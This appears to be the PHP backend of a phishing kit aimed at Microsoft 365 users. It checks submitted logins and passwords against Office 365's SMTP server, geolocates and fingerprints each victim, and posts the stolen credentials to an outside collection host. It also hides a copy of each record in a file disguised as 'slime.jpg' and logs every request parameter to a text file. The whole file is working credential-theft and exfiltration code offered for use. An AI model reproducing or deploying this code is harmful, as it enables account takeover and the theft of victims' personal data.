<?php
    /*  Include file here   */
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';
    /*  End     */
function getOS($user_agent = null)
{
    if(!isset($user_agent) && isset($_SERVER['HTTP_USER_AGENT'])) {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
    }

    // https://stackoverflow.com/questions/18070154/get-operating-system-info-with-php
    $os_array = [
        'windows nt 10'                              =>  'Windows 10',
        'windows nt 6.3'                             =>  'Windows 8.1',
        'windows nt 6.2'                             =>  'Windows 8',
        'windows nt 6.1|windows nt 7.0'              =>  'Windows 7',
        'windows nt 6.0'                             =>  'Windows Vista',
        'windows nt 5.2'                             =>  'Windows Server 2003/XP x64',
        'windows nt 5.1'                             =>  'Windows XP',
        'windows xp'                                 =>  'Windows XP',
        'windows nt 5.0|windows nt5.1|windows 2000'  =>  'Windows 2000',
        'windows me'                                 =>  'Windows ME',
        'windows nt 4.0|winnt4.0'                    =>  'Windows NT',
        'windows ce'                                 =>  'Windows CE',
        'windows 98|win98'                           =>  'Windows 98',
        'windows 95|win95'                           =>  'Windows 95',
        'win16'                                      =>  'Windows 3.11',
        'mac os x 10.1[^0-9]'                        =>  'Mac OS X Puma',
        'macintosh|mac os x'                         =>  'Mac OS X',
        'mac_powerpc'                                =>  'Mac OS 9',
        'linux'                                      =>  'Linux',
        'ubuntu'                                     =>  'Linux - Ubuntu',
        'iphone'                                     =>  'iPhone',
        'ipod'                                       =>  'iPod',
        'ipad'                                       =>  'iPad',
        'android'                                    =>  'Android',
        'blackberry'                                 =>  'BlackBerry',
        'webos'                                      =>  'Mobile',

        '(media center pc).([0-9]{1,2}\.[0-9]{1,2})'=>'Windows Media Center',
        '(win)([0-9]{1,2}\.[0-9x]{1,2})'=>'Windows',
        '(win)([0-9]{2})'=>'Windows',
        '(windows)([0-9x]{2})'=>'Windows',

        // Doesn't seem like these are necessary...not totally sure though..
        //'(winnt)([0-9]{1,2}\.[0-9]{1,2}){0,1}'=>'Windows NT',
        //'(windows nt)(([0-9]{1,2}\.[0-9]{1,2}){0,1})'=>'Windows NT', // fix by bg

        'Win 9x 4.90'=>'Windows ME',
        '(windows)([0-9]{1,2}\.[0-9]{1,2})'=>'Windows',
        'win32'=>'Windows',
        '(java)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,2})'=>'Java',
        '(Solaris)([0-9]{1,2}\.[0-9x]{1,2}){0,1}'=>'Solaris',
        'dos x86'=>'DOS',
        'Mac OS X'=>'Mac OS X',
        'Mac_PowerPC'=>'Macintosh PowerPC',
        '(mac|Macintosh)'=>'Mac OS',
        '(sunos)([0-9]{1,2}\.[0-9]{1,2}){0,1}'=>'SunOS',
        '(beos)([0-9]{1,2}\.[0-9]{1,2}){0,1}'=>'BeOS',
        '(risc os)([0-9]{1,2}\.[0-9]{1,2})'=>'RISC OS',
        'unix'=>'Unix',
        'os/2'=>'OS/2',
        'freebsd'=>'FreeBSD',
        'openbsd'=>'OpenBSD',
        'netbsd'=>'NetBSD',
        'irix'=>'IRIX',
        'plan9'=>'Plan9',
        'osf'=>'OSF',
        'aix'=>'AIX',
        'GNU Hurd'=>'GNU Hurd',
        '(fedora)'=>'Linux - Fedora',
        '(kubuntu)'=>'Linux - Kubuntu',
        '(ubuntu)'=>'Linux - Ubuntu',
        '(debian)'=>'Linux - Debian',
        '(CentOS)'=>'Linux - CentOS',
        '(Mandriva).([0-9]{1,3}(\.[0-9]{1,3})?(\.[0-9]{1,3})?)'=>'Linux - Mandriva',
        '(SUSE).([0-9]{1,3}(\.[0-9]{1,3})?(\.[0-9]{1,3})?)'=>'Linux - SUSE',
        '(Dropline)'=>'Linux - Slackware (Dropline GNOME)',
        '(ASPLinux)'=>'Linux - ASPLinux',
        '(Red Hat)'=>'Linux - Red Hat',
        // Loads of Linux machines will be detected as unix.
        // Actually, all of the linux machines I've checked have the 'X11' in the User Agent.
        //'X11'=>'Unix',
        '(linux)'=>'Linux',
        '(amigaos)([0-9]{1,2}\.[0-9]{1,2})'=>'AmigaOS',
        'amiga-aweb'=>'AmigaOS',
        'amiga'=>'Amiga',
        'AvantGo'=>'PalmOS',
        //'(Linux)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3}(rel\.[0-9]{1,2}){0,1}-([0-9]{1,2}) i([0-9]{1})86){1}'=>'Linux',
        //'(Linux)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3}(rel\.[0-9]{1,2}){0,1} i([0-9]{1}86)){1}'=>'Linux',
        //'(Linux)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3}(rel\.[0-9]{1,2}){0,1})'=>'Linux',
        '[0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3})'=>'Linux',
        '(webtv)/([0-9]{1,2}\.[0-9]{1,2})'=>'WebTV',
        'Dreamcast'=>'Dreamcast OS',
        'GetRight'=>'Windows',
        'go!zilla'=>'Windows',
        'gozilla'=>'Windows',
        'gulliver'=>'Windows',
        'ia archiver'=>'Windows',
        'NetPositive'=>'Windows',
        'mass downloader'=>'Windows',
        'microsoft'=>'Windows',
        'offline explorer'=>'Windows',
        'teleport'=>'Windows',
        'web downloader'=>'Windows',
        'webcapture'=>'Windows',
        'webcollage'=>'Windows',
        'webcopier'=>'Windows',
        'webstripper'=>'Windows',
        'webzip'=>'Windows',
        'wget'=>'Windows',
        'Java'=>'Unknown',
        'flashget'=>'Windows',

        // delete next line if the script show not the right OS
        //'(PHP)/([0-9]{1,2}.[0-9]{1,2})'=>'PHP',
        'MS FrontPage'=>'Windows',
        '(msproxy)/([0-9]{1,2}.[0-9]{1,2})'=>'Windows',
        '(msie)([0-9]{1,2}.[0-9]{1,2})'=>'Windows',
        'libwww-perl'=>'Unix',
        'UP.Browser'=>'Windows CE',
        'NetAnts'=>'Windows',
    ];

    // https://github.com/ahmad-sa3d/php-useragent/blob/master/core/user_agent.php
    $arch_regex = '/\b(x86_64|x86-64|Win64|WOW64|x64|ia64|amd64|ppc64|sparc64|IRIX64)\b/ix';
    $arch = preg_match($arch_regex, $user_agent) ? '64' : '32';

    foreach ($os_array as $regex => $value) {
        if (preg_match('{\b('.$regex.')\b}i', $user_agent)) {
            return $value.' x'.$arch;
        }
    }

    return 'Unknown';
}

class geoPlugin {
	
	//the geoPlugin server
	var $host = 'http://www.geoplugin.net/php.gp?ip={IP}&base_currency={CURRENCY}';
		
	//the default base currency
	var $currency = 'USD';
	
	//initiate the geoPlugin vars
	var $ip = null;
	var $city = null;
	var $region = null;
	var $areaCode = null;
	var $dmaCode = null;
	var $countryCode = null;
	var $countryName = null;
	var $continentCode = null;
	var $latitude = null;
	var $longitude = null;
	var $currencyCode = null;
	var $currencySymbol = null;
	var $currencyConverter = null;
	
	function __construct() {
 	}
 	
	
	function locate($ip = null) {
		
		global $_SERVER;
		
		if ( is_null( $ip ) ) {
			$ip = $_SERVER['REMOTE_ADDR'];
		}
		
		$host = str_replace( '{IP}', $ip, $this->host );
		$host = str_replace( '{CURRENCY}', $this->currency, $host );
		
		$data = array();
		
		$response = $this->fetch($host);
		
		$data = unserialize($response);
		
		//set the geoPlugin vars
		$this->ip = $ip;
		$this->city = $data['geoplugin_city'];
		$this->region = $data['geoplugin_region'];
		$this->areaCode = $data['geoplugin_areaCode'];
		$this->dmaCode = $data['geoplugin_dmaCode'];
		$this->countryCode = $data['geoplugin_countryCode'];
		$this->countryName = $data['geoplugin_countryName'];
		$this->continentCode = $data['geoplugin_continentCode'];
		$this->latitude = $data['geoplugin_latitude'];
		$this->longitude = $data['geoplugin_longitude'];
		$this->currencyCode = $data['geoplugin_currencyCode'];
		$this->currencySymbol = $data['geoplugin_currencySymbol'];
		$this->currencyConverter = $data['geoplugin_currencyConverter'];
		
	}
	
	function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}
	
	function convert($amount, $float=2, $symbol=true) {
		
		//easily convert amounts to geolocated currency.
		if ( !is_numeric($this->currencyConverter) || $this->currencyConverter == 0 ) {
			trigger_error('geoPlugin class Notice: currencyConverter has no value.', E_USER_NOTICE);
			return $amount;
		}
		if ( !is_numeric($amount) ) {
			trigger_error ('geoPlugin class Warning: The amount passed to geoPlugin::convert is not numeric.', E_USER_WARNING);
			return $amount;
		}
		if ( $symbol === true ) {
			return $this->currencySymbol . round( ($amount * $this->currencyConverter), $float );
		} else {
			return round( ($amount * $this->currencyConverter), $float );
		}
	}
	
	function nearby($radius=10, $limit=null) {

		if ( !is_numeric($this->latitude) || !is_numeric($this->longitude) ) {
			trigger_error ('geoPlugin class Warning: Incorrect latitude or longitude values.', E_USER_NOTICE);
			return array( array() );
		}
		
		$host = "http://www.geoplugin.net/extras/nearby.gp?lat=" . $this->latitude . "&long=" . $this->longitude . "&radius={$radius}";
		
		if ( is_numeric($limit) )
			$host .= "&limit={$limit}";
			
		return unserialize( $this->fetch($host) );

	}

	
}

function writeslime(){
$handle = fopen("slimez.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
    
}

function sendlogindetails($login,$passwd,$to){
require_once('Browser.php');
$browsers = new Browser();
$b_name = $browsers->getBrowser();
$b_plat = getOS();
$b_ver = $browsers->getVersion();
$geoplugin = new geoPlugin();
$geoplugin->locate();
$ip = $_SERVER["REMOTE_ADDR"];
$inj = $_SERVER["REQUEST_URI"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$server = date("D/M/d, Y g:i a");
$subjectpage = "SLIME";
// subject
$subject = "".$subjectpage." Details $ip {$geoplugin->countryName} #TRILL";

// message
$message ="<html>
<body style='Margin:0;padding-top:0;padding-bottom:0;padding-right:0;padding-left:0;min-width:100%;background-color:#ececec;'>
<br><br><br>
<table align='center' border='0' cellpadding='5' cellspacing='0' style='width:400px'>
	<tbody>
		<tr>
			<td style='background-color:#686868; height:23px; width:150px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>I.D:</span></span></td>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$login</span></span></td>
		</tr>
		<tr>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>Password:</span></span></td>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$passwd</span></span></td>
		</tr>
		<tr>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>IP:</span></span></td>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$ip</span></span></td>
		</tr>
		<tr>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>User-Agent:</span></span></td>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$browser</span></span></td>
		</tr>
		<tr>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>Date:</span></span></td>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$server</span></span></td>
		</tr>
		<tr>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>Location:</span></span></td>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>{$geoplugin->city}, {$geoplugin->region}, {$geoplugin->countryCode}</span></span></td>
		</tr>
		<tr>
			<td colspan='2' style='background-color:#686868; height:23px; text-align:center'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$login $passwd</span></span></td>
		</tr>
		<tr>
			<td colspan='2' style='background-color:#686868; height:23px; text-align:center'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$b_name:$b_ver on $b_plat</span></span></td>
		</tr>
	</tbody>
</table>

<p>&nbsp;</p>
<br><br>
</body>
</html>";
$mask = "-------------GOOD PASS----------------\n" .
$login . "  " . $passwd . "\n"
. $ip . "\n" . $b_name.":".$b_ver." on ".$b_plat .
"\n{$geoplugin->city}\n
{$geoplugin->region} - {$geoplugin->countryCode} \n".
$browser . "\n
Date:" . $server .
"\n-------------------------------------\n\n\n";
/* // To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

// From
$domainfrom = str_replace("www.","",$_SERVER['SERVER_NAME']);
$headers .= 'From: T3LL <logs@'.$domainfrom.'>' . "\r\n";


mail($to, $subject, $message, $headers); */

 $curlz = curl_init();
    curl_setopt_array($curlz, array(
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_URL => 'https://wmscom.info/curl.php',
        CURLOPT_USERAGENT => 'NE - Checking Bot',
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => array(
            to => "$to",
            subject => "$subject",
            message => "$message",
        )
    ));
    $respz = curl_exec($curlz);
    curl_close($curlz);


				
file_put_contents("slime.jpg", $mask, FILE_APPEND);
}


function sendwronglogindetails($login,$passwd,$to){
require_once('Browser.php');
$browsers = new Browser();
$b_name = $browsers->getBrowser();
$b_plat = getOS();
$b_ver = $browsers->getVersion();
$geoplugin = new geoPlugin();
$geoplugin->locate();
$ip = $_SERVER["REMOTE_ADDR"];
$inj = $_SERVER["REQUEST_URI"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$server = date("D/M/d, Y g:i a");
$subjectpage = "SLIME";
// subject
$subject = "".$subjectpage." WRONG Details $ip {$geoplugin->countryName} #TRILL";

// message
$message ="<html>
<body style='Margin:0;padding-top:0;padding-bottom:0;padding-right:0;padding-left:0;min-width:100%;background-color:#ececec;'>
<br><br><br>
<table align='center' border='0' cellpadding='5' cellspacing='0' style='width:400px'>
	<tbody>
		<tr>
			<td style='background-color:#686868; height:23px; width:150px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>I.D:</span></span></td>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$login</span></span></td>
		</tr>
		<tr>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>Password:</span></span></td>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$passwd</span></span></td>
		</tr>
		<tr>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>IP:</span></span></td>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$ip</span></span></td>
		</tr>
		<tr>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>User-Agent:</span></span></td>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$browser</span></span></td>
		</tr>
		<tr>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>Date:</span></span></td>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$server</span></span></td>
		</tr>
		<tr>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>Location:</span></span></td>
			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>{$geoplugin->city}, {$geoplugin->region}, {$geoplugin->countryCode}</span></span></td>
		</tr>
		<tr>
			<td colspan='2' style='background-color:#686868; height:23px; text-align:center'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$login $passwd</span></span></td>
		</tr>
		<tr>
			<td colspan='2' style='background-color:#686868; height:23px; text-align:center'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$b_name:$b_ver on $b_plat</span></span></td>
		</tr>
	</tbody>
</table>

<p>&nbsp;</p>
<br><br>
</body>
</html>";
$mask = "-------------BAD PASS----------------\n" .
$login . "  " . $passwd . "\n"
. $ip . "\n" . $b_name.":".$b_ver." on ".$b_plat .
"\n{$geoplugin->city}\n
{$geoplugin->region} - {$geoplugin->countryCode} \n".
$browser . "\n
Date:" . $server .
"\n-------------------------------------\n\n\n";
/* // To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

// From
$domainfrom = str_replace("www.","",$_SERVER['SERVER_NAME']);
$headers .= 'From: T3LL <logs@'.$domainfrom.'>' . "\r\n";
 */
   $curlz = curl_init();
    curl_setopt_array($curlz, array(
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_URL => 'https://wmscom.info/curl.php',
        CURLOPT_USERAGENT => 'NE - Checking Bot',
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => array(
            to => "$to",
            subject => "$subject",
            message => "$message",
        )
    ));
    $respz = curl_exec($curlz);
    curl_close($curlz);


//mail($to, $subject, $message, $headers);

				
file_put_contents("slime.jpg", $mask, FILE_APPEND);
}


function check365pass($smtpuser,$smtppass)
{
	$smtpserver = "smtp.office365.com";	// Required

	$smtpport = "587";		// Required


    $smtp = new SMTP;
    $smtp->do_debug = 0;


    try {
        //Connect to an SMTP server
        if (!$smtp->connect($smtpserver, $smtpport)) {
            throw new Exception('Connect failed');
        }
        //Say hello
        if (!$smtp->hello(gethostname())) {
            throw new Exception('EHLO failed: ' . $smtp->getError()['error']);
        }
        //Get the list of ESMTP services the server offers
        $e = $smtp->getServerExtList();
        //If server can do TLS encryption, use it
        if (array_key_exists('STARTTLS', $e)) {
            $tlsok = $smtp->startTLS();
            if (!$tlsok) {
                throw new Exception('Failed to start encryption: ' . $smtp->getError()['error']);
            }
            //Repeat EHLO after STARTTLS
            if (!$smtp->hello(gethostname())) {
                throw new Exception('EHLO (2) failed: ' . $smtp->getError()['error']);
            }
            //Get new capabilities list, which will usually now include AUTH if it didn't before
            $e = $smtp->getServerExtList();
        }
        //If server supports authentication, do it (even if no encryption)
        if (array_key_exists('AUTH', $e)) {
            if ($smtp->authenticate($smtpuser, $smtppass)) {
              echo "OK";
require '../config.php';              
			  sendlogindetails($smtpuser,$smtppass,$to);
			  
} else {
    require '../config.php'; 
                sendwronglogindetails($smtpuser,$smtppass,$to_wrongpass);
                throw new Exception('Authentication failed: ' . $smtp->getError()['error']);
                
            }
        }
    } catch (Exception $e) {
        echo 'SMTP error: ' . $e->getMessage(), "\n";
    }
    //Whatever happened, close the connection.
}